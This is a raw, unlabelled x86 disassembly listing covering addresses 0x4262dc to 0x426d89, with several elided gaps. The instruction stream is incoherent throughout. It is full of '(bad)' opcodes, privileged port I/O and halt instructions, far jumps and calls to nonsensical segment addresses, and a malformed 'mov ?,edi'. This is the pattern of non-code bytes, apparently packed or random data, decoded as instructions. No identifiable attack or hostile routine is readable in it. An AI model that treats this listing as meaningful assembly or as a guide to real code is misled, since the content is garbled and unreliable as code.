  4262dc:	cli    
  4262dd:	gs xchg esi,eax
  4262df:	sbb    bh,dl
  4262e1:	aaa    
  4262e2:	xor    al,0xc2
  4262e4:	in     eax,dx
  4262e5:	add    eax,0x3785d2b
  4262ea:	cli    
  4262eb:	daa    
  4262ec:	shr    BYTE PTR [edi+ebx*2+0x27efacf6],1
  4262f3:	xor    esp,DWORD PTR [ebx+ebx*4]
  4262f6:	xlat   BYTE PTR gs:[ebx]
  4262f8:	mov    ecx,0xf5576971
  4262fd:	dec    ebp
  4262fe:	inc    eax
  4262ff:	hlt    
  426300:	or     DWORD PTR [ecx+0x79],0xee6ef233
  426307:	hlt    
  426308:	popa   
  426309:	test   esi,0x164d5085
  42630f:	inc    eax
	...
  426374:	push   esp
  426375:	and    eax,0xeefd4e8d
  42637a:	xlat   BYTE PTR ds:[ebx]
  42637b:	aas    
  42637c:	dec    ecx
  42637d:	sbb    esi,edi
  42637f:	or     eax,0xa1a122b0
  426384:	call   0x4426520
  426389:	add    DWORD PTR [eax],eax
  42638b:	add    dl,bh
  42638d:	ror    DWORD PTR [ebp+0x2ccfeae4],cl
  426393:	or     dl,BYTE PTR [edx-0x6c]
  426396:	popa   
  426397:	sub    BYTE PTR [ebx-0x59ea754a],0x4d
  42639e:	div    ebp
  4263a0:	adc    bl,bh
  4263a2:	test   al,0xa6
  4263a4:	jle    0x426339
  4263a6:	fadd   QWORD PTR ds:0x607625ac
  4263ac:	lea    eax,[edi]
  4263ae:	jle    0x4263a2
  4263b0:	lds    edx,FWORD PTR [ebx+edi*8+0x64119c97]
  4263b7:	pop    edx
  4263b8:	ret    
  4263b9:	adc    esp,esi
  4263bb:	push   edx
  4263bc:	mov    ds:0x44d1824e,al
  4263c1:	or     al,BYTE PTR [ebx-0x5e]
  4263c4:	out    dx,eax
  4263c5:	leave  
  4263c6:	scas   eax,DWORD PTR es:[edi]
  4263c7:	sub    eax,0xc34cf392
  4263cc:	mov    cl,BYTE PTR [eax-0x5d]
  4263cf:	retf   
  4263d0:	sbb    eax,0xdddb6371
  4263d5:	mov    ebx,gs
  4263d7:	sbb    eax,0x4e008498
  4263dc:	mov    edi,0xfef226d6
  4263e1:	cmp    DWORD PTR [edi-0x4b],ecx
  4263e4:	jmp    0x8f399c22
  4263e9:	add    DWORD PTR [ecx-0x51],ebp
  4263ec:	jo     0x42639a
  4263ee:	stc    
  4263ef:	xor    BYTE PTR [edx+ebp*1],cl
  4263f2:	loope  0x426444
  4263f4:	add    eax,DWORD PTR [ecx]
  4263f6:	mov    ch,cl
  4263f8:	xlat   BYTE PTR ds:[ebx]
  4263f9:	jg     0x42644a
  4263fb:	inc    ecx
  4263fc:	outs   dx,DWORD PTR ds:[esi]
  4263fd:	out    dx,eax
  4263fe:	or     dh,BYTE PTR [ebx]
  426400:	mov    ds:0xcd0147bf,al
  426405:	dec    edi
  426406:	pop    ebp
  426407:	jno    0x42643b
  426409:	call   0x6eaabb94
  42640e:	add    BYTE PTR [ecx],al
  426410:	sbb    BYTE PTR [edx+0x22],0x69
  426414:	retf   0x5096
  426417:	fisttp QWORD PTR [eax-0x1c9a9b78]
  42641d:	push   ds
  42641e:	ds sub ch,0x41
  426422:	pop    ebx
  426423:	sub    dl,BYTE PTR [edx+0x4991938f]
  426429:	mov    edx,0xadf0ba18
  42642e:	mov    esp,0xe1812233
  426433:	dec    ebx
  426434:	pop    edi
  426435:	and    eax,0x9a299d18
  42643a:	out    dx,al
  42643b:	test   al,0xb4
  42643d:	mov    ebx,0x1f0013d1
  426442:	sar    DWORD PTR [ecx-0x74ccab3e],0x52
  426449:	cwde   
  42644a:	cmp    esi,esp
  42644c:	and    esp,ecx
  42644e:	pop    esp
  42644f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426450:	(bad)  
  426451:	sub    eax,0x600c2a3b
  426456:	jno    0x426498
  426458:	lods   al,BYTE PTR ds:[esi]
  426459:	xor    eax,0xee5be9ab
  42645e:	xchg   esi,eax
  42645f:	(bad)  
  426462:	and    eax,0x3248c0ad
  426467:	imul   ebp,DWORD PTR [ebp-0x5b322907],0x7c
  42646e:	sti    
  42646f:	sahf   
  426470:	nop
  426471:	add    DWORD PTR es:[ebp+0xd827a75],0x74aaf5d4
  42647c:	jae    0x4264f8
  42647e:	adc    eax,0x121f957
  426483:	push   ebp
  426484:	in     al,dx
  426485:	imul   ebp,DWORD PTR [ecx+ebp*2],0x4e17dbd5
  42648c:	ret    0xa626
  42648f:	stos   DWORD PTR es:[edi],eax
	...
  4264f4:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  4264fb:	outs   dx,DWORD PTR ds:[esi]
  4264fc:	vmwrite ecx,DWORD PTR [edx-0x5d57057b]
  426503:	pop    esp
  426504:	in     al,dx
  426505:	cwde   
  426506:	add    DWORD PTR [eax],eax
  426508:	add    al,0x1
  42650a:	add    BYTE PTR [eax],al
  42650c:	mov    ebp,0x23e6f292
  426511:	xor    eax,0x5311d7fa
  426516:	cli    
  426517:	js     0x4264a4
  426519:	outs   dx,DWORD PTR ds:[esi]
  42651a:	adc    eax,0xcec25092
  42651f:	sbb    DWORD PTR [eax-0x2a702a67],edi
  426525:	pop    esp
  426526:	ja     0x426574
  426528:	xchg   esi,eax
  426529:	mov    edi,edx
  42652b:	xchg   ebx,eax
  42652c:	mov    dl,0x39
  42652e:	xchg   eax,edi
  426530:	arpl   WORD PTR [edx-0x67297c5a],bx
  426536:	outs   dx,DWORD PTR ds:[esi]
  426537:	dec    ebx
  426538:	adc    BYTE PTR ds:0xd9542ad5,bl
  42653e:	push   esp
  42653f:	and    BYTE PTR [eax+ebp*1],bh
  426542:	bound  ebx,QWORD PTR [ebp-0x21]
  426545:	sub    dl,BYTE PTR [edi-0x60c956e7]
  42654b:	outs   dx,DWORD PTR ds:[esi]
  42654c:	cli    
  42654d:	add    BYTE PTR [edi],cl
  42654f:	mov    cl,0x95
  426551:	push   ds
  426552:	cs stos DWORD PTR es:[edi],eax
  426554:	jg     0x4264df
  426556:	pop    ss
  426557:	(bad)  
  426558:	sbb    al,0xcc
  42655a:	mov    eax,ds:0xa380021
  42655f:	cmc    
  426560:	pushf  
  426561:	xor    DWORD PTR [ebx],0x18201433
  426567:	(bad)  
  426568:	cmp    dl,BYTE PTR [esi+0x70bd4980]
  42656e:	es enter 0xb16c,0x10
  426573:	dec    edx
  426574:	loope  0x4265c4
  426576:	enter  0x5dce,0xa3
  42657a:	lea    esp,[esi]
  42657c:	mov    al,BYTE PTR [eax]
  42657e:	sub    BYTE PTR [ecx],0xb3
  426581:	lahf   
  426582:	ins    BYTE PTR es:[edi],dx
  426583:	pop    edi
  426584:	nop
  426585:	pop    edi
  426586:	dec    eax
  426587:	or     BYTE PTR [esi-0x72],cl
  42658a:	push   ecx
  42658b:	ins    DWORD PTR es:[edi],dx
  42658c:	mov    ecx,gs
  42658e:	push   cs
  42658f:	jecxz  0x4265e2
  426591:	xor    BYTE PTR fs:[eax-0x779d2be],dh
  426598:	hlt    
  426599:	cli    
  42659a:	mov    edi,0xdbf41acd
  42659f:	sub    ebp,DWORD PTR [ebx+0x70]
  4265a2:	jg     0x4265e3
  4265a4:	es ror DWORD PTR cs:[ebx],cl
  4265a8:	sub    eax,0xaff4e36a
  4265ad:	retf   0xb122
  4265b0:	cmp    ah,ch
  4265b2:	push   0x6087ac4a
  4265b7:	pop    ds
  4265b8:	mov    edx,0xefa206c0
  4265bd:	std    
  4265be:	jno    0x426573
  4265c0:	xor    ebp,DWORD PTR [edi]
  4265c2:	jae    0x4265f3
  4265c4:	test   al,0xce
  4265c6:	cmp    DWORD PTR [ebp+ebx*1+0x6750a166],edi
  4265cd:	mov    ch,BYTE PTR [ebx+esi*4-0x41e96276]
  4265d4:	aad    0xf0
  4265d6:	outs   dx,DWORD PTR ds:[esi]
  4265d7:	jns    0x4265f5
  4265d9:	and    al,0xda
  4265db:	inc    ecx
  4265dc:	sbb    al,0x48
  4265de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4265df:	xor    eax,0x304af836
  4265e4:	push   DWORD PTR [edx]
  4265e6:	jo     0x42659c
  4265e8:	mov    ebp,0x65a2b2ce
  4265ed:	push   eax
  4265ee:	lahf   
  4265ef:	aad    0x61
  4265f1:	add    BYTE PTR [ebp+0x21],0x44
  4265f5:	int3   
  4265f6:	cmp    BYTE PTR [edi+eax*4-0x782c5ca],al
  4265fd:	lea    esp,ds:0xaf4d6c1d
  426603:	lea    edx,[eax-0x25]
  426606:	inc    esp
  426607:	fwait
  426608:	sar    DWORD PTR [ecx],cl
  42660a:	stos   DWORD PTR es:[edi],eax
  42660b:	cmp    DWORD PTR [ecx+0x52d820],esi
	...
  426671:	add    BYTE PTR [eax],al
  426673:	add    BYTE PTR [edx],dl
  426675:	retf   
  426676:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42667c:	pop    DWORD PTR [edi-0x2f46925c]
  426682:	popf   
  426683:	and    dh,al
  426685:	cdq    
  426686:	add    DWORD PTR [eax],eax
  426688:	add    al,0x1
  42668a:	add    BYTE PTR [eax],al
  42668c:	fisttp WORD PTR [ecx]
  42668e:	xor    al,0x7b
  426690:	jp     0x426698
  426692:	push   ds
  426693:	xchg   esp,eax
  426694:	or     al,0x99
  426696:	stos   BYTE PTR es:[edi],al
  426697:	fidiv  DWORD PTR [ecx+0x74]
  42669a:	inc    ecx
  42669b:	js     0x426711
  42669d:	xchg   edi,eax
  42669e:	inc    esi
  42669f:	push   eax
  4266a0:	mov    ebp,edi
  4266a2:	jmp    0x623a:0x78e089f9
  4266a9:	sub    BYTE PTR ds:0x1201e07,0x88
  4266b0:	xor    ah,0x3e
  4266b3:	inc    edi
  4266b4:	addr16 and al,0x25
  4266b7:	or     eax,0xdc17ef75
  4266bc:	xor    al,0x35
  4266be:	adc    bh,bl
  4266c0:	fcomp  QWORD PTR [esi]
  4266c2:	jb     0x426706
  4266c4:	push   ebx
  4266c5:	pop    ss
  4266c6:	loop   0x42673f
  4266c8:	cwde   
  4266c9:	add    DWORD PTR [ebx+0x40],eax
  4266cc:	xchg   edi,esp
  4266ce:	dec    esi
  4266cf:	sub    eax,0xa65d9070
  4266d4:	ret    
  4266d5:	push   edx
  4266d6:	mov    BYTE PTR [esi+0x2e],cl
  4266d9:	jnp    0x4266a4
  4266db:	test   BYTE PTR [ecx-0x26],0x2
  4266df:	dec    edx
  4266e0:	ror    ebp,cl
  4266e2:	jae    0x4266c0
  4266e4:	dec    ecx
  4266e5:	mov    cl,0xab
  4266e7:	mov    ebx,0x5817a39b
  4266ec:	in     eax,0xcc
  4266ee:	(bad)
  4266f3:	dec    edx
  4266f4:	sbb    DWORD PTR [ebx],edx
  4266f6:	cmc    
  4266f7:	pop    esp
  4266f8:	je     0x4266c8
  4266fa:	mov    ah,0x5b
  4266fc:	std    
  4266fd:	and    ah,bl
  4266ff:	in     eax,0xf5
  426701:	popf   
  426702:	imul   eax,DWORD PTR [ebx+edx*8-0x175c170b],0xffffff92
  42670a:	xchg   edi,eax
  42670b:	mov    WORD PTR [esi+0x45d6261f],gs
  426711:	mov    esi,ecx
  426713:	dec    esp
  426714:	neg    DWORD PTR [ecx-0x611162bb]
  42671a:	push   DWORD PTR [eax+0x65f041f4]
  426720:	mov    esp,edx
  426722:	pop    ds
  426723:	mov    ebp,0x7d9eff18
  426728:	cmp    ecx,DWORD PTR [eax-0x4d3cf63a]
  42672e:	xchg   BYTE PTR [ebp+eiz*2+0x5f],bh
  426732:	dec    eax
  426733:	pop    eax
  426734:	xchg   ebp,eax
  426735:	es push cs
  426737:	sbb    BYTE PTR [esi+0x6f],ch
  42673a:	sub    esi,ecx
  42673c:	retf   0x2591
  42673f:	iret   
  426740:	out    0x14,al
  426742:	inc    edi
  426743:	sub    eax,0xda45f36a
  426748:	adc    al,0xf7
  42674a:	int3   
  42674b:	fbstp  TBYTE PTR [edx]
  42674d:	mov    esi,0xfd15cdae
  426752:	and    bl,BYTE PTR [edx-0x68]
  426755:	sbb    ecx,esp
  426757:	sub    esi,DWORD PTR [eax-0x15ad3366]
  42675d:	inc    ebp
  42675e:	add    ecx,ecx
  426760:	ds sti 
  426762:	push   0x3
  426764:	xor    DWORD PTR [ebx+0x23728de],0xff152c72
  42676e:	(bad)  [esi-0xe19769b]
  426774:	mov    esi,0x825dc08c
  426779:	sub    eax,esi
  42677b:	dec    edi
  42677c:	jae    0x42679a
  42677e:	test   ebp,ebx
  426780:	xchg   edi,eax
  426781:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426782:	les    eax,FWORD PTR [edx-0x6428d8f8]
  426788:	pop    edx
  426789:	das    
  42678a:	sub    ebx,edi
  42678c:	aaa    
  42678d:	jbe    0x426715
  42678f:	pop    ebp
	...
  4267f4:	mov    eax,0xff2ace8d
  4267f9:	imul   edi,esp,0xffffff9f
  4267fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267fd:	and    dh,0xca
  426800:	mov    al,ds:0xf43b78b6
  426805:	call   0x0:0x1040001
  42680c:	lods   eax,DWORD PTR ds:[esi]
  42680d:	test   eax,0x823c50b4
  426812:	pop    ecx
  426813:	push   cs
  426814:	fisttp DWORD PTR [ebp-0x25]
  426817:	or     edi,DWORD PTR [ecx+0x13]
  42681a:	icebp  
  42681b:	dec    DWORD PTR [ebp+edi*1-0x1b]
  42681f:	in     al,0xb1
  426821:	sbb    esp,DWORD PTR [ecx]
  426823:	adc    ch,BYTE PTR [edi+0x14]
  426826:	stc    
  426827:	sub    ecx,eax
  426829:	adc    eax,0x3dc34316
  42682e:	dec    esp
  42682f:	fldcw  WORD PTR [edx]
  426831:	push   esp
  426832:	add    al,0x28
  426834:	push   ds
  426835:	lea    ecx,[ebx+0x8]
  426838:	jg     0x426853
  42683a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42683b:	scas   eax,DWORD PTR es:[edi]
  42683c:	adc    dl,BYTE PTR [ebp+ecx*4+0x7428475e]
  426843:	fucom  st(1)
  426845:	xchg   esi,eax
  426846:	jmp    0x69c4:0xd24842c3
  42684d:	cmp    eax,0x32fae3cd
  426852:	je     0x4267e1
  426854:	aam    0x71
  426856:	mov    ecx,DWORD PTR [edi]
  426858:	push   0x17a4989c
  42685d:	or     DWORD PTR [ecx],ebx
  42685f:	out    0xc0,eax
  426861:	in     eax,dx
  426862:	xchg   esp,eax
  426863:	mov    bl,0xdb
  426865:	int    0xe4
  426867:	retf   0x381f
  42686a:	lods   al,BYTE PTR ds:[esi]
  42686b:	adc    DWORD PTR [ebp-0xb],esp
  42686e:	adc    bl,BYTE PTR [ebp-0x54]
  426871:	add    BYTE PTR [esi+0x68],ah
  426874:	rcl    bh,1
  426876:	pop    eax
  426877:	cwde   
  426878:	adc    DWORD PTR [ecx+eax*2-0x1472a8f0],0x7a271020
  426883:	pop    ebx
  426884:	mov    ebx,0x5802a178
  426889:	stos   DWORD PTR es:[edi],eax
  42688a:	sub    al,0x17
  42688c:	fwait
  42688d:	sbb    al,0x5e
  42688f:	mov    bl,0x64
  426891:	call   0x2adb:0xef4cf81d
  426898:	push   ss
  426899:	xchg   BYTE PTR [edi],dh
  42689b:	xchg   ebp,esi
  42689d:	pop    esi
  42689e:	ja     0x426876
  4268a0:	scas   al,BYTE PTR es:[edi]
  4268a1:	fidiv  WORD PTR [esi-0x7f]
  4268a4:	into   
  4268a5:	jne    0x4268bf
  4268a7:	jmp    0xd382:0x59041718
  4268ae:	scas   eax,DWORD PTR es:[edi]
  4268af:	pop    ecx
  4268b0:	ret    0xea95
  4268b3:	ss mov esp,0xd0eed7d8
  4268b9:	cmp    esi,eax
  4268bb:	pop    edx
  4268bc:	int    0x34
  4268be:	bound  eax,QWORD PTR [esi]
  4268c0:	popa   
  4268c1:	and    eax,0x1c3281
  4268c6:	rol    DWORD PTR [edi-0x33],cl
  4268c9:	imul   ecx,DWORD PTR [ebx],0x2c
  4268cc:	das    
  4268cd:	pop    ebx
  4268ce:	push   ecx
  4268cf:	inc    edi
  4268d0:	jns    0x4268fd
  4268d2:	jno    0x426930
  4268d4:	or     ebx,DWORD PTR [esi-0x3]
  4268d7:	jp     0x4268a8
  4268d9:	mov    ebx,0x50c90858
  4268de:	stc    
  4268df:	adc    al,0x96
  4268e1:	es out 0x2c,eax
  4268e4:	jp     0x4268c2
  4268e6:	fsub   DWORD PTR [edx-0x58]
  4268e9:	test   al,0x61
  4268eb:	test   eax,0xe97d3af9
  4268f0:	out    dx,eax
  4268f1:	push   edx
  4268f2:	aad    0xfd
  4268f4:	retf   0x78e6
  4268f7:	jno    0x42693c
  4268f9:	mov    ds:0x45f6e68c,eax
  4268fe:	pop    edx
  4268ff:	int    0x82
  426901:	lods   al,BYTE PTR ds:[esi]
  426902:	retf   
  426903:	rcr    DWORD PTR [edx],cl
  426905:	scas   eax,DWORD PTR es:[edi]
  426906:	or     DWORD PTR [ebx],esp
  426908:	test   eax,0xa4451448
  42690d:	adc    eax,0xc6d5
	...
  426972:	add    BYTE PTR [eax],al
  426974:	mov    WORD PTR [esi+0x7d],cs
  426977:	jge    0x426978
  426979:	jg     0x426907
  42697b:	jmp    FWORD PTR [ebx]
  42697d:	in     al,dx
  42697e:	lahf   
  42697f:	mov    esi,DWORD PTR [esi-0x24]
  426982:	test   al,0xab
  426984:	clc    
  426985:	fwait
  426986:	add    DWORD PTR [eax],eax
  426988:	add    al,0x1
  42698a:	add    BYTE PTR [eax],al
  42698c:	push   esi
  42698d:	xchg   esp,eax
  42698e:	scas   al,BYTE PTR es:[edi]
  42698f:	adc    DWORD PTR [eax],esp
  426991:	mov    ah,0xd2
  426993:	mov    esi,0x1b28adfd
  426998:	js     0x42694a
  42699a:	add    eax,0x11751198
  42699f:	neg    BYTE PTR [ecx]
  4269a1:	lahf   
  4269a2:	dec    edx
  4269a3:	xchg   edx,eax
  4269a4:	jbe    0x426a1b
  4269a6:	jp     0x42699d
  4269a8:	dec    eax
  4269a9:	loope  0x426971
  4269ab:	pop    esi
  4269ac:	adc    ebx,DWORD PTR [eax+0x15]
  4269af:	aas    
  4269b0:	jmp    0xbdcfef44
  4269b5:	fst    QWORD PTR cs:[esi-0x66d30dc]
  4269bc:	mov    cs,WORD PTR ds:0xcf2a528b
  4269c2:	xchg   DWORD PTR [ebx-0x2ab48a9b],esi
  4269c8:	mov    esi,0xa03a25b
  4269cd:	cmp    DWORD PTR [di+0x4e],0xfffffffb
  4269d2:	jmp    0x426a03
  4269d4:	jp     0x4269fe
  4269d6:	push   es
  4269d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269d8:	mov    edi,0x7d705ced
  4269dd:	and    DWORD PTR [edi-0x7844f257],esp
  4269e3:	data16 jl 0x426a19
  4269e6:	fwait
  4269e7:	sub    DWORD PTR [ecx],ebx
  4269e9:	mov    bl,0x78
  4269eb:	or     BYTE PTR [ecx+0x9055cc9],ah
  4269f1:	sbb    bl,BYTE PTR [ecx+ecx*1-0x3fa1477c]
  4269f8:	jo     0x4269d9
  4269fa:	dec    edx
  4269fb:	(bad)  
  4269fc:	xchg   ebp,eax
  4269fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269fe:	call   0x24a8c9b0
  426a03:	and    DWORD PTR [esi],edx
  426a05:	pop    es
  426a06:	push   ecx
  426a07:	les    ebp,FWORD PTR [ebx-0x61]
  426a0a:	dec    eax
  426a0b:	jg     0x4269f8
  426a0d:	sahf   
  426a0e:	xor    al,0xdb
  426a10:	outs   dx,DWORD PTR ds:[esi]
  426a11:	loop   0x426a91
  426a13:	sub    eax,DWORD PTR [ecx+0x72]
  426a16:	fcmovu st,st(4)
  426a18:	ins    BYTE PTR es:[edi],dx
  426a19:	mov    ah,0x80
  426a1b:	outs   dx,BYTE PTR ds:[esi]
  426a1c:	xor    BYTE PTR [eax],0xba
  426a1f:	stc    
  426a20:	fsubp  st(3),st
  426a22:	and    DWORD PTR ds:0x3a61ffdd,esi
  426a28:	cmp    eax,0xc6d88c03
  426a2d:	idiv   BYTE PTR [esi+eiz*8-0x48]
  426a31:	jmp    0x3faff4a0
  426a36:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  426a38:	test   al,0xda
  426a3a:	test   al,0x15
  426a3c:	sub    al,BYTE PTR ds:0x5812a46a
  426a42:	inc    ebp
  426a43:	popf   
  426a44:	rcl    BYTE PTR [edx+0x62],cl
  426a47:	ret    
  426a48:	and    BYTE PTR [edi-0x7f],0x42
  426a4c:	pop    ss
  426a4d:	pop    ecx
  426a4e:	adc    ah,ah
  426a50:	push   edx
  426a51:	xchg   ecx,eax
  426a52:	mov    WORD PTR [ecx-0x265e6d2],cs
  426a58:	xchg   edi,eax
  426a59:	test   DWORD PTR [esi+0x33a14df9],eax
  426a5f:	mov    esp,0x5f1be59
  426a64:	mov    DWORD PTR [eax+0x6cc0b7c6],ecx
  426a6a:	ret    0x66e
  426a6d:	pop    ebx
  426a6e:	loope  0x426a3a
  426a70:	test   BYTE PTR fs:[edx-0x38c47720],dl
  426a77:	scas   eax,DWORD PTR es:[edi]
  426a78:	fcmovnu st,st(1)
  426a7a:	ret    
  426a7b:	push   ebp
  426a7c:	sub    DWORD PTR [edi+0x223deb23],ebp
  426a82:	jno    0x426adf
  426a84:	add    DWORD PTR [edi*2+0x74dcc033],eax
  426a8b:	bound  eax,QWORD PTR [ecx]
  426a8d:	stc    
  426a8e:	mov    DWORD PTR [eax+eax*1+0x0],edx
	...
  426af1:	add    BYTE PTR [eax],al
  426af3:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  426af9:	ja     0x426ad6
  426afb:	out    dx,eax
  426afc:	inc    esi
  426afd:	sub    DWORD PTR [esi],edi
  426aff:	or     al,0x1
  426b01:	xchg   edx,eax
  426b02:	fwait
  426b03:	icebp  
  426b04:	cld    
  426b05:	pushf  
  426b06:	add    DWORD PTR [eax],eax
  426b08:	add    al,0x1
  426b0a:	add    BYTE PTR [eax],al
  426b0c:	iret   
  426b0d:	bound  ecx,QWORD PTR [ecx+0x4728e88a]
  426b13:	ds ins DWORD PTR es:[edi],dx
  426b15:	pop    es
  426b16:	imul   edx,DWORD PTR [ebp+0x52],0x69
  426b1a:	jae    0x426b1b
  426b1c:	leave  
  426b1d:	imul   ecx,DWORD PTR [eax+0x789cef13],0xa8669481
  426b27:	pop    eax
  426b28:	call   FWORD PTR [edx-0x5e9e77dd]
  426b2e:	xchg   ebp,eax
  426b2f:	xchg   ecx,eax
  426b30:	mov    DWORD PTR [edx-0x724ca8e6],edx
  426b36:	into   
  426b37:	mov    eax,ds:0x3bc6320b
  426b3c:	jb     0x426b4d
  426b3e:	addr16 jnp 0x426b78
  426b41:	cmp    al,0x7c
  426b43:	jnp    0x426b2d
  426b45:	imul   ebp,DWORD PTR [edi-0x6c],0x30
  426b49:	push   0xe326ef36
  426b4e:	nop
  426b4f:	jl     0x426bbf
  426b51:	cwde   
  426b52:	bndstx [esi+ebp*8],(bad)
  426b56:	ins    BYTE PTR es:[edi],dx
  426b57:	or     eax,0x90c48f80
  426b5c:	cmp    eax,0x3b5ad187
  426b61:	add    DWORD PTR [ebx+0x7b],0xffffffa6
  426b65:	sub    al,0xba
  426b67:	jno    0x426b2d
  426b69:	xor    BYTE PTR [ebx],bh
  426b6b:	or     BYTE PTR [edx-0x61],bh
  426b6e:	rcl    BYTE PTR [edi+ebp*4-0xf],cl
  426b72:	fdivr  QWORD PTR [ebp-0xc]
  426b75:	mov    bl,0x40
  426b77:	test   eax,0x80639eba
  426b7c:	cmp    edi,DWORD PTR [ecx]
  426b7e:	mov    edi,0x3fd4017e
  426b83:	sbb    al,ah
  426b85:	jle    0x426bc9
  426b87:	cmp    eax,0x98532d04
  426b8c:	push   ebx
  426b8d:	push   ebx
  426b8e:	mov    cl,0xcc
  426b90:	mov    esi,0x1de7d54b
  426b95:	ret    
  426b96:	xchg   ebx,eax
  426b97:	shl    esp,1
  426b99:	test   al,0xbf
  426b9b:	mov    esi,DWORD PTR [eax+ecx*1+0x34]
  426b9f:	sbb    dh,ch
  426ba1:	loop   0x426c14
  426ba3:	pop    esi
  426ba4:	xor    DWORD PTR [esi-0x4c8f2923],0xd735154a
  426bae:	adc    DWORD PTR [ebp-0x59],0xffffff9d
  426bb2:	fs icebp 
  426bb4:	adc    DWORD PTR [edx+0x471f56dd],esi
  426bba:	enter  0x4cea,0x82
  426bbe:	mov    ecx,0xfc46baf6
  426bc3:	pop    edi
  426bc4:	addr16 jmp 0x426b50
  426bc7:	pop    edi
  426bc8:	or     ah,BYTE PTR [edx-0x42]
  426bcb:	cdq    
  426bcc:	push   esp
  426bcd:	mov    al,ds:0xbcc428f0
  426bd2:	ja     0x426c23
  426bd4:	hlt    
  426bd5:	push   ds
  426bd6:	mov    ecx,0xb701a5d7
  426bdb:	xchg   esp,eax
  426bdc:	xor    edx,esi
  426bde:	mov    cl,0xf4
  426be0:	sub    eax,0x1c293830
  426be5:	lods   al,BYTE PTR ds:[esi]
  426be6:	inc    ebx
  426be7:	inc    ebp
  426be8:	dec    esi
  426be9:	jo     0x386ea958
  426bef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426bf0:	inc    esp
  426bf1:	and    ch,BYTE PTR [esi-0x3e]
  426bf4:	scas   al,BYTE PTR es:[edi]
  426bf5:	mov    ecx,0x5e5e9067
  426bfa:	mov    ds:0xddfa9a0b,al
  426bff:	sbb    al,0xb1
  426c01:	inc    esi
  426c02:	aam    0x85
  426c04:	or     DWORD PTR [edi+0x78],ecx
  426c07:	out    dx,eax
  426c08:	mov    ebp,0x37071572
  426c0d:	push   eax
  426c0e:	dec    ebp
  426c0f:	mov    ds:0x0,al
	...
  426c74:	loop   0x426cd6
  426c76:	test   DWORD PTR [esi+0x74f3f787],esi
  426c7c:	mov    ah,0xeb
  426c7e:	cld    
  426c7f:	mov    edx,0x3f9d09e3
  426c84:	add    BYTE PTR [esi+0x1040001],bl
  426c8a:	add    BYTE PTR [eax],al
  426c8c:	adc    eax,0x8f6f7880
  426c91:	inc    ebp
  426c92:	sub    eax,0x8ee0c824
  426c97:	pop    ss
  426c98:	or     edx,DWORD PTR [ecx+0xc]
  426c9b:	jecxz  0x426c40
  426c9d:	sbb    al,0x79
  426c9f:	cld    
  426ca0:	daa    
  426ca1:	pop    eax
  426ca2:	outs   dx,DWORD PTR ds:[esi]
  426ca3:	adc    ah,BYTE PTR [ebp+0x5ef950aa]
  426ca9:	adc    esp,DWORD PTR [edi-0x56eaf9c3]
  426caf:	adc    DWORD PTR [edi],eax
  426cb1:	pop    edx
  426cb2:	sbb    al,0x88
  426cb4:	sbb    bh,BYTE PTR [ecx]
  426cb6:	shl    BYTE PTR [esi],1
  426cb8:	or     BYTE PTR [eax-0x19d5c93f],dl
  426cbe:	aad    0xf0
  426cc0:	dec    edx
  426cc1:	cmp    eax,0x904ff586
  426cc6:	cmp    eax,0x4e6b344c
  426ccb:	jmp    0x9a42:0xb9c0213a
  426cd2:	cmp    dl,bl
  426cd4:	pushf  
  426cd5:	or     ebx,DWORD PTR [edi-0x5159c471]
  426cdb:	and    DWORD PTR [edi+0x3c],0xa10f79e3
  426ce2:	(bad)  
  426ce3:	sub    eax,0xffb9cd31
  426ce8:	adc    DWORD PTR [edx-0x4026b11a],0x78
  426cef:	pop    edi
  426cf0:	fcomp  st(0)
  426cf2:	dec    edi
  426cf3:	popa   
  426cf4:	xor    DWORD PTR [edx-0x39d1c429],eax
  426cfa:	mov    edx,0xd8068a27
  426cff:	retf   
  426d00:	sbb    al,bh
  426d02:	mov    BYTE PTR [eax],cl
  426d04:	cdq    
  426d05:	xor    eax,0x6ed751a0
  426d0a:	sahf   
  426d0b:	aam    0x3b
  426d0d:	aaa    
  426d0e:	jg     0x426d67
  426d10:	mov    eax,ds:0x938e4e37
  426d15:	inc    edi
  426d16:	pushf  
  426d17:	es inc ebx
  426d19:	dec    ebx
  426d1a:	mov    ds:0xd7c5d550,al
  426d1f:	ja     0x426ca5
  426d21:	sbb    ebx,eax
  426d23:	inc    esi
  426d24:	push   cs
  426d25:	adc    BYTE PTR [eax+0x6e],bl
  426d28:	mov    ?,edi
  426d2a:	xlat   BYTE PTR ds:[ebx]
  426d2b:	in     al,dx
  426d2c:	jnp    0x426d19
  426d2e:	push   ebx
  426d2f:	outs   dx,DWORD PTR ds:[esi]
  426d30:	or     bl,0xb0
  426d33:	fisub  WORD PTR [esi+eiz*2-0x1f4ae73d]
  426d3a:	icebp  
  426d3b:	or     eax,0xb57e28ed
  426d40:	clc    
  426d41:	dec    esp
  426d42:	or     BYTE PTR [ebx+0x3c],ah
  426d45:	repnz pop edx
  426d47:	mov    DWORD PTR [ebp+0x1d7c9bf0],ebp
  426d4d:	xchg   esp,eax
  426d4e:	and    al,0xd5
  426d50:	pop    ss
  426d51:	sbb    eax,0xbffd0c67
  426d56:	test   bl,bh
  426d58:	out    dx,eax
  426d59:	pop    esi
  426d5a:	xor    cl,BYTE PTR [ecx-0x63]
  426d5d:	mov    ah,0x47
  426d5f:	sbb    BYTE PTR [edi-0x42ec4ce3],dh
  426d65:	jle    0x426d7d
  426d67:	outs   dx,DWORD PTR ds:[esi]
  426d68:	cs repz std 
  426d6b:	add    BYTE PTR [eax],bl
  426d6d:	rcl    BYTE PTR [ebp+0x1c],cl
  426d70:	out    0xb1,eax
  426d72:	repz push 0xffffffd8
  426d75:	cmp    eax,0xe055ca98
  426d7a:	inc    DWORD PTR [esi+0x2c3c7f74]
  426d80:	push   cs
  426d81:	mov    dh,0x7
  426d83:	mov    edi,0xf327fc9c
  426d88:	lods   eax,DWORD PTR ds:[esi]
  426d89:	dec    edx
